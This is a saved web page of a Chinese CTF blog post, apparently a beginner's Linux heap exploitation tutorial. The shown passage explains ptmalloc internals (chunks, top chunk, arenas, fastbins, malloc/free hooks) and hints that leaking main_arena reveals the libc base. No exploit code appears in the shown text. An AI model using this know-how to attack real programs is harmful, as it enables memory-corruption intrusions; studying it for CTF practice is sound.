<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="CTF-PWN-简易Linux堆利用入门教程by arttnba3 不要满足于做一个ptmalloc拳击手   大部分内容来自于 glibc2.23malloc源码分析 - I：堆内存的基本组织形式   0x00.写在开始之前 对于堆管理器的利用一直以来都是CTF比赛中的热点，按我的感受来看通常情况下大比赛的签到题都会是一道easy heap，同时由于其知识点的繁复冗杂，对于Linux的堆管理器的">
<meta property="og:type" content="article">
<meta property="og:title" content="【CTF资料-0x0002】简易Linux堆利用入门教程by arttnba3">
<meta property="og:url" content="http://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="CTF-PWN-简易Linux堆利用入门教程by arttnba3 不要满足于做一个ptmalloc拳击手   大部分内容来自于 glibc2.23malloc源码分析 - I：堆内存的基本组织形式   0x00.写在开始之前 对于堆管理器的利用一直以来都是CTF比赛中的热点，按我的感受来看通常情况下大比赛的签到题都会是一道easy heap，同时由于其知识点的繁复冗杂，对于Linux的堆管理器的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/12/16/BnJgR7Kd2VMYHhk.png">
<meta property="og:image" content="https://i.loli.net/2020/12/18/MAmvtL1zrpo9sFV.png">
<meta property="og:image" content="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png">
<meta property="og:image" content="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png">
<meta property="og:image" content="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png">
<meta property="og:image" content="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png">
<meta property="og:image" content="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png">
<meta property="og:image" content="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png">
<meta property="og:image" content="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png">
<meta property="og:image" content="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png">
<meta property="og:image" content="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png">
<meta property="og:image" content="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png">
<meta property="og:image" content="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png">
<meta property="og:image" content="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png">
<meta property="og:image" content="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png">
<meta property="og:image" content="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png">
<meta property="og:image" content="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png">
<meta property="og:image" content="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png">
<meta property="og:image" content="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png">
<meta property="og:image" content="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/y7LnNfmzYWPuc9G.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/7NYPhxkrXisWUqB.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/6i8zvdhmw31ekBn.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/gXxwGDlWqTkPVLK.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/6W2lrHsLmZ7hRvE.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/AR2OPinM8D5Kaeu.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/XtUISQ2ckoZgbsz.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/D2uwcevXVQsqJih.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/6RWdGglwUM8ntLO.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/DdY3TGBJjmfSkVP.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/Hnj1BqmPCirKRLk.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/wSIONf7Epij3lCq.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/YpaDTSGX2mLBzvQ.png">
<meta property="og:image" content="https://i.loli.net/2021/01/23/Ga3ehQvfPrDdLpJ.png">
<meta property="og:image" content="https://i.loli.net/2021/01/22/hOBAxz4YWRQoaf2.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png">
<meta property="og:image" content="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png">
<meta property="og:image" content="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png">
<meta property="og:image" content="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png">
<meta property="og:image" content="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png">
<meta property="og:image" content="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png">
<meta property="og:image" content="https://s3.ax1x.com/2020/11/20/DQ7UyV.png">
<meta property="og:image" content="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png">
<meta property="og:image" content="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png">
<meta property="og:image" content="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png">
<meta property="og:image" content="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png">
<meta property="og:image" content="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png">
<meta property="og:image" content="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png">
<meta property="og:image" content="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png">
<meta property="og:image" content="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png">
<meta property="og:image" content="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png">
<meta property="og:image" content="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png">
<meta property="og:image" content="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png">
<meta property="og:image" content="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png">
<meta property="og:image" content="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png">
<meta property="og:image" content="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png">
<meta property="og:image" content="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png">
<meta property="og:image" content="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png">
<meta property="og:image" content="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png">
<meta property="og:image" content="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png">
<meta property="og:image" content="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png">
<meta property="og:image" content="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png">
<meta property="og:image" content="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png">
<meta property="og:image" content="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png">
<meta property="og:image" content="https://i.loli.net/2021/01/30/x3I8sHJpvRqmajM.png">
<meta property="article:published_time" content="2021-02-23T19:56:56.000Z">
<meta property="article:modified_time" content="2021-02-23T20:16:27.899Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="信息安全">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="堆">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="python">
<meta property="article:tag" content="栈迁移">
<meta property="article:tag" content="UAF">
<meta property="article:tag" content="Integer Overflow">
<meta property="article:tag" content="Fastbin Attack">
<meta property="article:tag" content="tcache poisoning">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/12/16/BnJgR7Kd2VMYHhk.png">

<link rel="canonical" href="http://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>【CTF资料-0x0002】简易Linux堆利用入门教程by arttnba3 | arttnba3's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">arttnba3's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="arttnba3">
      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="arttnba3's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【CTF资料-0x0002】简易Linux堆利用入门教程by arttnba3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-24 03:56:56 / Modified: 04:16:27" itemprop="dateCreated datePublished" datetime="2021-02-24T03:56:56+08:00">2021-02-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="CTF-PWN-简易Linux堆利用入门教程by-arttnba3"><a href="#CTF-PWN-简易Linux堆利用入门教程by-arttnba3" class="headerlink" title="CTF-PWN-简易Linux堆利用入门教程by arttnba3"></a>CTF-PWN-简易Linux堆利用入门教程by arttnba3</h1><blockquote>
<p>不要满足于做一个ptmalloc拳击手</p>
</blockquote>
<blockquote>
<p>大部分内容来自于<a href="https://arttnba3.cn/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/" target="_blank" rel="noopener"> glibc2.23malloc源码分析 - I：堆内存的基本组织形式 </a></p>
</blockquote>
<h2 id="0x00-写在开始之前"><a href="#0x00-写在开始之前" class="headerlink" title="0x00.写在开始之前"></a>0x00.写在开始之前</h2><p> 对于堆管理器的利用一直以来都是CTF比赛中的热点，<del>按我的感受来看通常情况下大比赛的签到题都会是一道easy heap</del>，同时由于其知识点的繁复冗杂，对于Linux的堆管理器的利用也是Pwner们的学习路径上的一个瓶颈，因此本人决定撰写该教程，希望能够帮助更多初入pwn世界的萌新们尽快掌握对于堆管理器的美妙利用</p>
<p>当然，本教程并不专业，笔者更加推荐想要深入了解CTF中ptmalloc堆利用的同学前往CTF wiki</p>
<p>本教程仅为入门级别的教程，仅适用于初识堆利用的萌新，对于对堆管理器已经有着一定的了解或者再往上的大师傅们请无视</p>
<h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><ul>
<li>x86汇编语言基础</li>
<li>C语言基础</li>
<li>数据结构基础（推荐至少要Leetcode上的链表题能写中等难度的水平（OI佬请无视））</li>
</ul>
<h2 id="0x01-堆内存的分配-amp-释放"><a href="#0x01-堆内存的分配-amp-释放" class="headerlink" title="0x01.堆内存的分配&amp;释放"></a>0x01.堆内存的分配&amp;释放</h2><p>堆内存大概是位于图上的位置，增长方向如箭头所示：<strong>从低地址向高地址增长</strong></p>
<p><img src="https://i.loli.net/2020/12/16/BnJgR7Kd2VMYHhk.png" alt="image.png"></p>
<h3 id="系统调用：brk"><a href="#系统调用：brk" class="headerlink" title="系统调用：brk"></a>系统调用：brk</h3><p>brk系统调用用于增长堆区</p>
<h3 id="内存分配基本思想：重用"><a href="#内存分配基本思想：重用" class="headerlink" title="内存分配基本思想：重用"></a>内存分配基本思想：重用</h3><p>堆管理器处于用户程序与内核中间，主要做以下工作</p>
<ol>
<li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ol>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>malloc()函数用于分配chunk，空闲chunk不满足条件时会合并相邻空闲chunk | 切割空闲chunk</p>
<h4 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h4><p>位于libc中的函数指针变量，通常为NULL，不为NULL时malloc()函数会优先调用该函数指针</p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>free()函数用于将对应的空闲chunk放入相应的bin中，还会合并相邻空闲chunk</p>
<h4 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h4><p>位于libc中的函数指针变量，通常为NULL，不为NULL时free()函数会优先调用该函数指针，传入的参数为要free的chunk</p>
<h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><p>用以扩展chunk，相邻chunk闲置且空间充足则会进行合并，否则会重新分配chunk</p>
<h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook"></a>__realloc_hook</h4><p>位于libc中的函数指针变量，通常为NULL，不为NULL时realloc()函数会优先调用该函数指针</p>
<h2 id="0x02-堆相关数据结构"><a href="#0x02-堆相关数据结构" class="headerlink" title="0x02.堆相关数据结构"></a>0x02.堆相关数据结构</h2><h3 id="1-chunk"><a href="#1-chunk" class="headerlink" title="1.chunk"></a>1.chunk</h3><p>通常情况下，我们将向系统所申请得到的内存块称之为一个<strong>chunk</strong></p>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>在ptmalloc的内部使用malloc_chunk结构体来表示，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      <span class="built_in">size</span>;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>各字段含义如下：</p>
<ul>
<li><strong>prev_size</strong>:用以保存前一个内存物理地址相邻的chunk的size，<strong>仅在该chunk为free状态时会被使用到</strong></li>
<li><strong>size</strong>：顾名思义，用以保存这个chunk的<strong>总的大小，即同时包含chunk头</strong>（<strong>prev_size + size</strong>）<strong>和chunk剩余部分的大小</strong></li>
<li><strong>fd</strong>&amp;&amp;<strong>bk</strong>：<strong>仅在在chunk被free后使用</strong>，用以连接其他的chunk，<strong>也就是说当chunk处于被使用的状态时该字段无效，被用以存储用户的数据</strong></li>
<li><strong>fd_nextsize</strong>&amp;&amp;<strong>bk_nextsize</strong>：仅在在chunk被free后使用，用以连接其他的chunk</li>
</ul>
<p>由于最后的两个变量仅用于较大的free的chunk，故我们先暂且忽略</p>
<p>那么我们便可以知道：<strong>一个chunk在内存中大概是长这个样子的</strong>：</p>
<p><img src="https://i.loli.net/2020/12/18/MAmvtL1zrpo9sFV.png" alt="image.png"></p>
<p>其中prev_size字段与size字段被称之为chunk header，用以存储chunk相关数据，剩下的部分才是系统真正返回给用户进行使用的部分</p>
<h4 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h4><p>Top Chunk是所有chunk中较为特殊的一个chunk，由于系统调用的开销较大，故一般情况下malloc都不会频繁地直接调用brk系统调用开辟堆内存空间，而是会在一开始时先向系统申请一个较大的Top Chunk，后续需要取用内存时便从Top chunk中切割，直到Top chunk不足以分配所需大小的chunk时才会进行系统调用</p>
<h3 id="2-arena"><a href="#2-arena" class="headerlink" title="2.arena"></a>2.arena</h3><p>arena这个词直译是“竞技场”的意思，<del>wsm要起这种奇怪的名字我也不知道，可能是因为听起来比较帅气吧</del>，按照笔者的理解，arena在ptmalloc中用以表示<strong>「单个线程独立维护的内存池」</strong>，这是由于大部分情况下对于每个线程而言其都会单独有着一个arena实例用以管理属于该线程的堆内存区域，包括Bins、Fastbin等其实都是被放置在arena的结构体中统一进行管理的</p>
<h4 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h4><p>main_arena为一个定义于malloc.c中的静态的malloc_state结构体，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are several instances of this struct ("arenas") in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>该arena位于libc中</strong>，而并不似<strong>其他arena一般位于堆区</strong></p>
<p>在堆题中通常通过泄露arena的地址以获得libc的基址</p>
<h4 id="①fast-bin"><a href="#①fast-bin" class="headerlink" title="①fast bin"></a>①fast bin</h4><p>ptmalloc<strong>独立于Bins之外单独设计了一个Fastbin用以储存一些size较小的闲置chunk</strong></p>
<ul>
<li>Fastbins是一个用以保存最近释放的较小的chunk的数组，为了提高速度其<strong>使用单向链表进行链接</strong></li>
<li><strong>Fastbin采取FILO/LIFO的策略，即每次都取用fastbin链表头部的chunk，每次释放chunk时都插入至链表头部成为新的头结点</strong>，因而大幅提高了存取chunk的速度</li>
<li><strong>Fastbin中的chunk永远保持在in_use的状态，这也保证了她们不会被与其他的free chunk合并</strong></li>
<li><strong>malloc_consolidate()函数将会清空fastbin中所有的chunk，在进行相应的合并后送入普通的small bins中</strong></li>
<li><strong>32位下最大的fastbin chunk size为0x40， 64位下最大的fastbin chunk size为0x80，超过这个范围的chunk在free之后则会被送入unsorted bin中</strong></li>
</ul>
